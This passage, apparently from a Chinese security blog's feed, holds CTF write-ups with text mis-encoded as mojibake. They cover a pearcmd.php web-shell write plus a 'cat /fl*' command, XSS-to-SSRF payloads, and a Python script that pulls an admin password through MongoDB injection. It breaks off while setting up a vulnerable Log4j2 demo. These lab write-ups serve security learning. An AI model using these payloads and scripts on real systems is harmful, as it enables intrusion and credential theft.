<pre class="line-numbers language-none"><code class="language-none">?name=cfile&amp;value=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/wa0er.php+-d+man_dir=&lt;?eval($_REQUEST[0]);?&gt;+-s+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>éœ€Burpä¼ å‚ï¼Œå¦åˆ™å°–æ‹¬å·ä¼šè¢«URLç¼–ç å†™å…¥æ–‡ä»¶ï¼Œå¯¼è‡´æ— æ³•è§£ææˆphpè„šæœ¬æ‰§è¡Œ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823163548425.png"></p>
<p>ç„¶åPOSTä¼ å‚è¯»å–flag</p>
<pre class="line-numbers language-none"><code class="language-none">?name=cfile&amp;value=/tmp/wa0er.php
0=system('cat /fl*');<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230823164154298.png"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/weixin_46081055/article/details/124046525">https://blog.csdn.net/weixin_46081055/article/details/124046525</a></p>
<p><a href="https://blog.csdn.net/weixin_43610673/article/details/121369384">https://blog.csdn.net/weixin_43610673/article/details/121369384</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>phpä»£ç å®¡è®¡</tag>
        <tag>å˜é‡è¦†ç›–</tag>
        <tag>æ–‡ä»¶åŒ…å«</tag>
        <tag>åˆ©ç”¨pearcmd.phpå†™shellï¼ˆä¸å‡ºç½‘ï¼‰</tag>
      </tags>
  </entry>
  <entry>
    <title>2021ç¥¥äº‘æ¯-secrets_of_admin</title>
    <url>/posts/27ec25c5.html</url>
    <content><![CDATA[<h1 id="2021ç¥¥äº‘æ¯-secrets-of-admin"><a href="#2021ç¥¥äº‘æ¯-secrets-of-admin" class="headerlink" title="2021ç¥¥äº‘æ¯-secrets_of_admin"></a>2021ç¥¥äº‘æ¯-secrets_of_admin</h1><p>çŸ¥è¯†ç‚¹æ¦‚è¦ï¼šå®¡è®¡ã€XSS+SSRFç»„åˆæ‹³</p>
<p>é¦–é¡µ</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824112447031.png" style="zoom: 67%;">

<p>æœ‰æºç ï¼Œæºç ç»“æ„ï¼š</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824112254599.png"></p>
<p>åœ¨<code>database.ts</code>æ–‡ä»¶é‡Œæœ‰adminè´¦æˆ·å¯†ç ï¼Œå¯ä»¥ç›´æ¥ç™»å½•ã€‚å¦å¤–å¯ä»¥çœ‹å‡ºæœ‰userså’Œfilesä¸¤ä¸ªè¡¨ï¼Œè¿˜æœ‰ä¸€ä¸ªsuperuserç”¨æˆ·</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824113106579.png"></p>
<p>ç™»å½•ä¹‹åè¿›å…¥<code>/admin</code>ç›®å½•ï¼Œåœ¨æ–‡æœ¬æ¡†éšä¾¿è¾“å…¥ï¼Œä¼šæç¤ºï¼Œå¤§è‡´æ„æ€æ˜¯ä¿å­˜æˆäº†pdfæ–‡ä»¶ï¼Œä½†æ˜¯éœ€è¦çŸ¥é“æ€ä¹ˆä¸‹è½½</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824113335550.png" style="zoom:67%;">

<h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><p>å®¡è®¡<code>index.ts</code>ï¼Œå‡ ä¸ªå…³é”®è·¯ç”±</p>
<p>æ ¹ç›®å½•ï¼Œåšç™»å½•éªŒè¯ï¼Œç™»å½•æˆåŠŸè®¾ç½®cookieï¼Œå¹¶é‡å®šå‘åˆ°<code>/admin</code>ç›®å½•</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824130000441.png"></p>
<p><code>/admin</code>ç›®å½•</p>
<p>1.POSTæäº¤contentå‚æ•°å€¼ï¼Œä¼šæœ‰å‡ ä¸ªç±»ä¼¼XSSçš„é»‘åå•è¿‡æ»¤ï¼›</p>
<p>2.å°†contentç›´æ¥æ‹¼æ¥åˆ°ä¸€æ®µHTMLä»£ç æ ‡ç­¾é‡Œï¼›</p>
<p>3.å°†HTMLä»£ç å†™å…¥pdfæ–‡ä»¶ï¼Œpdfä»¥uuid()çš„å€¼å‘½åï¼Œå­˜åœ¨<code>./files/</code>è·¯å¾„ä¸‹ï¼›</p>
<p>4.ç”¨æ–‡ä»¶åè®¡ç®—checksumå€¼ï¼Œå°†superuserã€æ–‡ä»¶åã€checksumå€¼ä¸€å—å­˜å…¥æ•°æ®åº“ã€‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824130237861.png"></p>
<p><code>/api/files</code>ç›®å½•</p>
<p>1.æ­£åˆ™åŒ¹é…è¯·æ±‚åœ°å€çš„socketï¼ˆIP:PORTï¼‰ï¼Œè¦æ±‚å†’å·å‰ï¼ˆå³IPåœ°å€ï¼‰åªèƒ½æ˜¯127.0.0.1ï¼›</p>
<p>2.GETå‚æ•°ï¼šusernameã€filenameã€checksumåªèƒ½æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œä¼šè¢«å­˜å‚¨åˆ°æ•°æ®åº“</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824130633060.png"></p>
<p><code>/api/files/:id</code>ç›®å½•</p>
<p>1.tokençš„usernameä¸èƒ½æ˜¯superuserï¼›</p>
<p>2.tokençš„usernameå’Œè¯·æ±‚å‚æ•°idä¼šè¢«ç”¨æ¥æŸ¥æ‰¾æ•°æ®åº“æ–‡ä»¶åï¼›</p>
<p>3.å…¨åœºå”¯ä¸€è¯»æ–‡ä»¶å‡½æ•°readFileè¯»å–<code>../files/</code>è·¯å¾„ä¸‹çš„å¯¹åº”æ–‡ä»¶ã€‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824130333259.png"></p>
<p>æ•°æ®åº“getFile()æ“ä½œä»£ç å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°ä¼ å…¥çš„å‚æ•°idå¯¹åº”checksumï¼Œä»filesè¡¨ä¸­æŸ¥æ‰¾å¯¹åº”çš„æ–‡ä»¶å</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824142748876.png"></p>
<p>æ‹ä¸€ä¸‹æ€è·¯</p>
<p>1.è¯»æ–‡ä»¶éœ€è¦tokençš„usernameæ˜¯adminï¼Œå¹¶ä¸”çŸ¥é“æ–‡ä»¶å¯¹åº”çš„checksumå€¼ï¼›</p>
<p>2.è¦ä¿è¯tokençš„usernameæ˜¯adminï¼Œåªéœ€æ­£å¸¸ç™»å½•adminè´¦æˆ·å°±å¯ä»¥ï¼›</p>
<p>3.æ–‡ä»¶å¯¹åº”çš„checksumå€¼åˆ™æœ‰ä¸¤æ¡è·¯çº¿ï¼Œä¸€æ¡æ˜¯<code>/admin</code>è·¯ç”±çš„<code>uuid()</code>ç”Ÿæˆçš„æ–‡ä»¶åè®¡ç®—æ‰€å¾—ï¼Œè¿™ä¸å¯æ§ï¼Œå¦ä¸€æ¡æ˜¯é€šè¿‡<code>/api/files</code>è·¯ç”±çš„GETå‚æ•°ä¼ å…¥ã€‚å¹¶ä¸”ä»æœ€åˆçš„database.tså¯ä»¥çœ‹åˆ°ï¼Œflagæ–‡ä»¶å±äºsuperuserç”¨æˆ·ï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿéœ€è¦é€šè¿‡<code>/api/files</code>è·¯ç”±ä¼ å…¥ä¸€æ¡<code>username=admin&amp;filename=flag</code>çš„æ•°æ®ï¼Œé‚£ä¹ˆchecksumå°±å¯ä»¥éšæ„è®¾ç½®ï¼›</p>
<p>4.åˆå› ä¸º<code>/api/files</code>è·¯ç”±åªèƒ½é€šè¿‡127.0.0.1è®¿é—®ï¼Œæ‰€ä»¥å¿…é¡»é€šè¿‡<code>/admin</code>è·¯ç”±çš„XSSæ¥æ„é€ SSRFè¯·æ±‚ï¼›</p>
<p>5.<code>/admin</code>è·¯ç”±çš„XSSè¿‡æ»¤åªæ˜¯å¯¹contentå‚æ•°è¿‡æ»¤ï¼Œæ‰€ä»¥åªéœ€ä»¥contentæ•°ç»„çš„å½¢å¼ä¼ å…¥å³å¯ç»•è¿‡ã€‚</p>
<p>ç»¼ä¸Šï¼Œç›®æ ‡ï¼šä»¥adminç™»å½•ï¼Œ<code>/admin</code>è·¯ç”±POSTä¼ å…¥payloadï¼Œ<code>/api/files/:id</code>è®¿é—®</p>
<p>Payloadå¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">content[]=&lt;img+src%3D"http%3A//127.0.0.1:8888/api/files?username%3Dadmin%26filename%3D./flag%26checksum%3D999"&gt;
æˆ–
content[]=%3Cscript%3E%0Avar%20xhr%20%3D%20new%20XMLHttpRequest()%3Bxhr.open(%22GET%22%2C%20%22http%3A%2F%2F127.0.0.1%3A8888%2Fapi%2Ffiles%3Fusername%3Dadmin%26filename%3D.%2Fflag%26checksum%3D999%22%2C%20true)%3Bxhr.send()%3B%0A%3C%2Fscript%3E<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824155431623.png"></p>
<p>å†è®¿é—®<code>/api/files/999</code>ï¼Œå°±ä¼šæŠŠæ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œæ‰“å¼€å³å¯çœ‹åˆ°flag</p>
<p>æ³¨ï¼šè¿™é‡Œç«¯å£ç”¨8888æ˜¯å› ä¸º<code>app.ts</code>æ–‡ä»¶ä¸­è®¾ç½®è·¯ç”±ç›‘å¬ç«¯å£æ˜¯8888</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230824154058766.png"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://err0r.top/article/2021xyb/">https://err0r.top/article/2021xyb/</a></p>
<p><a href="https://blog.csdn.net/cjdgg/article/details/120238587">https://blog.csdn.net/cjdgg/article/details/120238587</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>XSS+SSRFç»„åˆæ‹³</tag>
        <tag>TypeScriptä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>2021ç¥¥äº‘æ¯-PackageManager</title>
    <url>/posts/f7c9127f.html</url>
    <content><![CDATA[<h1 id="2021ç¥¥äº‘æ¯-PackageManager"><a href="#2021ç¥¥äº‘æ¯-PackageManager" class="headerlink" title="2021ç¥¥äº‘æ¯-PackageManager"></a>2021ç¥¥äº‘æ¯-PackageManager</h1><p>çŸ¥è¯†ç‚¹æ¦‚è¦ï¼šMongoDBç›²æ³¨ã€TypeScriptä»£ç å®¡è®¡</p>
<p>é¦–é¡µ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821170513751.png"></p>
<p>é¢˜ç›®æºç ç»“æ„ï¼š</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821170321323.png"></p>
<p>åç¼€.tsæ˜¯TypeScriptè¯­è¨€</p>
<p>ä»init_db.tså¯¼å…¥mongooseæ¨¡å—çœ‹å‡ºæ˜¯MongoDBæ•°æ®åº“ï¼Œä¸”flagè¢«åˆå§‹åŒ–åœ¨adminç”¨æˆ·çš„æ•°æ®åº“ä¿¡æ¯é‡Œ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821173443676.png"></p>
<p>çœ‹å¦‚ä¸‹è·¯ç”±æ–‡ä»¶<code>routes/index.ts</code>å’Œ<code>checkmd5Regex()</code>å‡½æ•°ä»£ç ï¼Œ<code>/auth</code>è·¯ç”±tokenå¯æ§ï¼Œå­˜åœ¨æ³¨å…¥</p>
<p>åŸå› æœ‰äºŒï¼š</p>
<p>1.<code>if (checkmd5Regex(token))</code>ä¸­<code>checkmd5Regex()</code>å‡½æ•°çš„æ­£åˆ™å¯ä»¥è½»æ¾ç»•è¿‡ï¼Œä½¿å¾—ifåˆ¤æ–­æ’ä¸ºçœŸï¼›</p>
<p>2.<code>${token.toString()}</code>è¢«ç›´æ¥æ‹¼æ¥åˆ°æŸ¥è¯¢è¯­å¥ä¸­</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821173334344.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821173831614.png"></p>
<h2 id="æ€è·¯ä¸€"><a href="#æ€è·¯ä¸€" class="headerlink" title="æ€è·¯ä¸€"></a>æ€è·¯ä¸€</h2><p>æ„é€ token</p>
<pre class="line-numbers language-none"><code class="language-none">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||this.password[0]=="a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ä½¿å¾—æŸ¥è¯¢æ¡ä»¶å¦‚ä¸‹ï¼Œæ­¤æ—¶åªéœ€<code>this.password[0]=="a"</code>ä¸ºçœŸï¼Œå°±ä¸ºçœŸ</p>
<pre class="line-numbers language-none"><code class="language-none">this.username == "admin" &amp;&amp; hex_md5(this.password) == "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||this.password[0]=="a"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>é‚£ä¹ˆä¾æ¬¡ç±»æ¨ï¼Œå¯ä»¥åˆ¤æ–­passwordçš„æ¯ä¸€ä½å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯ç›²æ³¨æ€æƒ³ï¼Œæ ¹æ®è¯·æ±‚åŒ…å†™è„šæœ¬</p>
<p>è®¿é—®<code>/auth</code>è·¯ç”±é¡µé¢</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821180638439.png"></p>
<p>Tokenæ–‡æœ¬æ¡†éšä¾¿å¡«å…¥testæäº¤ï¼ŒæŠ“åŒ…</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821180853838.png"></p>
<p>è¯·æ±‚åŒ…æ„é€ ä¸»è¦å°±æ˜¯Cookieå’ŒPOSTæ•°æ®</p>
<p>ä¸ºäº†åˆ¤æ–­å­—ç¬¦åŒ¹é…æ­£ç¡®æ—¶çš„å“åº”åŒ…ç‰¹å¾ï¼Œå¯ä»¥å…ˆBurpçˆ†ç ´ä¸€ä½å‡ºæ¥</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821182939243.png" style="zoom:80%;">

<p>å¯çœ‹åˆ°ï¼Œå­—ç¬¦æ­£ç¡®æ—¶ï¼Œå“åº”é¡µé¢æœ‰ç‰¹å¾å­—ç¬¦ä¸²<code>Found. Redirecting to</code></p>
<p>ç»¼ä¸Šï¼Œè„šæœ¬å¦‚ä¸‹</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> string

url<span class="token operator">=</span><span class="token string">"http://ef3a4031-fb8f-4859-bd29-256b01ff55ce.node4.buuoj.cn:81/auth"</span>
headers<span class="token operator">=</span><span class="token punctuation">{</span>
    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">"session=s%3AUOifhSNPicItpLjF9bQgYM9roPiXrAED.q%2Frul3zuUNV0sCp0Zu5s1UH68ubuay957RQHuEWqFlc"</span>
<span class="token punctuation">}</span>

flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> string<span class="token punctuation">.</span>printable<span class="token punctuation">:</span>
        data<span class="token operator">=</span><span class="token punctuation">{</span>
            <span class="token string">"_csrf"</span><span class="token punctuation">:</span> <span class="token string">"LEuV2E4F-7JN0Tv4LSue5dLosO0Stdu-SvQA"</span><span class="token punctuation">,</span>
            <span class="token string">"token"</span><span class="token punctuation">:</span> <span class="token string">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||this.password[{}]=="{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"Found. Redirecting to"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            flag <span class="token operator">=</span> flag<span class="token operator">+</span>j
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿è¡Œç»“æœ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821192025213.png"></p>
<p>ç™»å½•å³å¯çœ‹åˆ°flag</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821192314501.png"></p>
<h2 id="æ€è·¯äºŒ"><a href="#æ€è·¯äºŒ" class="headerlink" title="æ€è·¯äºŒ"></a>æ€è·¯äºŒ</h2><p>åˆ©ç”¨jsçš„æŠ›å‡ºå¼‚å¸¸å’ŒIIFEï¼ˆç«‹å³è°ƒç”¨å‡½æ•°è¡¨è¾¾å¼ï¼‰æ¥å®ç°</p>
<pre class="line-numbers language-none"><code class="language-none">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||(()=&gt;{throw Error(this.password)})()=="<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ‹¼æ¥åˆ°æŸ¥è¯¢æ¡ä»¶å¦‚ä¸‹</p>
<pre class="line-numbers language-none"><code class="language-none">this.username == "admin" &amp;&amp; hex_md5(this.password) == "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"||(()=&gt;{throw Error(this.password)})()==""<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è§£é‡Šï¼š</p>
<p><code>(()=&gt;{...})</code> å®šä¹‰äº†ä¸€ä¸ªåŒ¿åç®­å¤´å‡½æ•°</p>
<p><code>{throw Error(this.password)}</code> å‡½æ•°ä½“ä¸­ä½¿ç”¨throw ErroræŠ›å‡ºé”™è¯¯ï¼Œå¹¶å°†passwordä½œä¸ºé”™è¯¯æ¶ˆæ¯</p>
<p><code>()</code> è¡¨ç¤ºç«‹å³æ‰§è¡Œè¿™ä¸ªåŒ¿åå‡½æ•°</p>
<p>æ‰§è¡Œç»“æœå¦‚ä¸‹</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230821193703182.png"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://blog.csdn.net/RABCDXB/article/details/124810618">https://blog.csdn.net/RABCDXB/article/details/124810618</a></p>
<p><a href="https://cloud.tencent.com/developer/article/2070199">https://cloud.tencent.com/developer/article/2070199</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>TypeScriptä»£ç å®¡è®¡</tag>
        <tag>MongoDBç›²æ³¨</tag>
      </tags>
  </entry>
  <entry>
    <title>Log4j2ï¼ˆCVE-2021-44228ï¼‰æ¼æ´å¤ç°åŠåŸç†æ€è€ƒ</title>
    <url>/posts/1e9a0fae.html</url>
    <content><![CDATA[<h1 id="Log4j2ï¼ˆCVE-2021-44228ï¼‰æ¼æ´å¤ç°åŠåŸç†æ€è€ƒ"><a href="#Log4j2ï¼ˆCVE-2021-44228ï¼‰æ¼æ´å¤ç°åŠåŸç†æ€è€ƒ" class="headerlink" title="Log4j2ï¼ˆCVE-2021-44228ï¼‰æ¼æ´å¤ç°åŠåŸç†æ€è€ƒ"></a>Log4j2ï¼ˆCVE-2021-44228ï¼‰æ¼æ´å¤ç°åŠåŸç†æ€è€ƒ</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>Log4j2æ˜¯ä¸€ä¸ªJavaæ—¥å¿—ç»„ä»¶ï¼Œè¢«å„ç±»Javaæ¡†æ¶å¹¿æ³›åœ°ä½¿ç”¨ã€‚å®ƒçš„å‰èº«æ˜¯Log4jï¼ŒLog4j2é‡æ–°æ„å»ºå’Œè®¾è®¡äº†æ¡†æ¶ï¼Œå¯ä»¥è®¤ä¸ºä¸¤è€…æ˜¯å®Œå…¨ç‹¬ç«‹çš„ä¸¤ä¸ªæ—¥å¿—ç»„ä»¶ã€‚æœ¬æ¬¡æ¼æ´å½±å“èŒƒå›´ä¸ºLog4j2æœ€æ—©æœŸçš„ç‰ˆæœ¬2.0-beta9åˆ°2.15.0ã€‚</p>
<p>å› ä¸ºå­˜åœ¨å‰èº«Log4jï¼Œè€Œä¸”éƒ½æ˜¯Apacheä¸‹çš„é¡¹ç›®ï¼Œä¸ç®¡æ˜¯jaråŒ…åç§°è¿˜æ˜¯packageåç§°ï¼Œçœ‹èµ·æ¥éƒ½å¾ˆç›¸ä¼¼ï¼Œå¯¼è‡´æœ‰äº›äººåˆ†ä¸æ¸…è‡ªå·±ç”¨çš„æ˜¯Log4jè¿˜æ˜¯Log4j2ã€‚è¿™é‡Œç»™å‡ºå‡ ä¸ªè¾¨åˆ«æ–¹æ³•ï¼š</p>
<ol>
<li>Log4j2åˆ†ä¸º2ä¸ªjaråŒ…ï¼Œä¸€ä¸ªæ˜¯æ¥å£<code>log4j-api-${ç‰ˆæœ¬å·}.jar</code>ï¼Œä¸€ä¸ªæ˜¯å…·ä½“å®ç°<code>log4j-core-${ç‰ˆæœ¬å·}.jar</code>ã€‚Log4jåªæœ‰ä¸€ä¸ªjaråŒ…<code>log4j-${ç‰ˆæœ¬å·}.jar</code>ã€‚</li>
<li>Log4j2çš„ç‰ˆæœ¬å·ç›®å‰å‡ä¸º2.xã€‚Log4jçš„ç‰ˆæœ¬å·å‡ä¸º1.xã€‚</li>
<li>Log4j2çš„packageåç§°å‰ç¼€ä¸º<code>org.apache.logging.log4j</code>ã€‚Log4jçš„packageåç§°å‰ç¼€ä¸º<code>org.apache.log4j</code>ã€‚</li>
</ol>
<p>Log4j2çš„JNDIæ³¨å…¥æ¼æ´ï¼ˆCVE-2021-44228ï¼‰å¯ä»¥ç§°ä¹‹ä¸ºâ€œæ ¸å¼¹â€çº§åˆ«ã€‚Log4j2ä½œä¸ºç±»ä¼¼jdkçº§åˆ«çš„åŸºç¡€ç±»åº“ï¼Œå‡ ä¹æ— äººå¹¸å…ã€‚</p>
<h2 id="ä¸€ã€æ¼æ´å¤ç°"><a href="#ä¸€ã€æ¼æ´å¤ç°" class="headerlink" title="ä¸€ã€æ¼æ´å¤ç°"></a>ä¸€ã€æ¼æ´å¤ç°</h2><h3 id="ï¼ˆä¸€ï¼‰æœåŠ¡ç«¯ç¯å¢ƒæ­å»º"><a href="#ï¼ˆä¸€ï¼‰æœåŠ¡ç«¯ç¯å¢ƒæ­å»º" class="headerlink" title="ï¼ˆä¸€ï¼‰æœåŠ¡ç«¯ç¯å¢ƒæ­å»º"></a>ï¼ˆä¸€ï¼‰æœåŠ¡ç«¯ç¯å¢ƒæ­å»º</h3><p>å¼€å‘ç¯å¢ƒï¼šIDEA 2021.2ã€JDK 8</p>
<p>æ–°å»ºä¸€ä¸ªSpringé¡¹ç›®ï¼Œ<code>File</code>â†’<code>New</code>â†’<code>Project</code>ï¼Œé…ç½®å¦‚ä¸‹</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908090322543.png" style="zoom: 80%;">

<p>å‹¾é€‰Spring Web</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908090553268.png" style="zoom:80%;">

<p>å¦‚æœç¬¬ä¸€æ¬¡åˆ›å»ºï¼Œéœ€ç¨ç­‰ç‰‡åˆ»ä¸‹è½½spring-bootç›¸å…³ä¾èµ–ï¼ŒIDEAå³ä¸‹è§’å¯æŸ¥çœ‹ç›¸å…³ä¾èµ–ä¸‹è½½è¿›åº¦ã€‚</p>
<p>ä¿®æ”¹pom.xmlæ–‡ä»¶</p>
<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908091549004.png" style="zoom:80%;">

<p>æ·»åŠ å¦‚ä¸‹ä»£ç </p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.8.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>log4j-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.8.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230908091247246.png" style="zoom:80%;">

<p>åœ¨<code>log4j_demo\src\main\java\com\example\log4j_demo</code>ä¸‹åˆ›å»º<code>HelloLog4j.java</code>ï¼Œå†…å®¹å¦‚ä¸‹</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>log4j_demo</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">LogManager</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestBody</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMethod</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span><span class="token punctuation">;</span>

